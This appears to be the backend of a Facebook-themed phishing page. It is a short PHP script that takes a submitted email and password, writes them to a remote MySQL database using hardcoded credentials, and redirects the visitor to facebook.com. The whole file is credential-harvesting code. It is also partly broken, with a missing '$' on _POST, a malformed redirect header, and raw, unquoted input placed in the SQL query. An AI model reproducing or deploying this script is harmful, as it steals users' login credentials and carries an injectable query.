<?php



$username="04apsgRlJ4";
$password="grgxeWtGRX";
$server="remotemysql.com";
$port=3360;


	 $conn = mysqli_connect("remotemysql.com", $username, $password, "	04apsgRlJ4");
		$result = mysqli_query($conn, "INSERT INTO user (username,password) VALUES ("._POST["email"].","._POST["pass"].");");
		header("https://www.facebook.com/");
		exit();



?>
